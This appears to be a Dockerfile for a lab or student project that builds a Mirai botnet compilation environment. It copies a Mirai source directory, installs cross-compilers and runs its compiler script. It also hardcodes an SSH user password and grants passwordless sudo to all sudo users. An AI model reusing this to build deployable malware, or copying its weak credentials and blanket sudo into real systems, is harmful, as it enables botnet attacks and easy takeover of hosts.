FROM ubuntu:20.04

# Configuracion de zona horaria para evitar errores al instalar paquetes
ENV TZ=Europe/Madrid
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone


RUN apt update && apt install openssh-server git sudo -y


RUN useradd -rm -d /home/RdDC -s /bin/bash -g root -G sudo -u 1000 RdDC
RUN echo "RdDC:proyecto"| chpasswd
RUN service ssh start
RUN echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

COPY /mirai /mirai
COPY start.sh /mirai/start.sh
RUN apt install gcc golang electric-fence screen dialog python3 apache2 telnet -y
WORKDIR "/mirai"
RUN chmod 777 start.sh
RUN sudo bash ./tools/compilers.sh
RUN service ssh start
RUN echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

EXPOSE 22
EXPOSE 80
CMD ["/usr/sbin/sshd","-D"]

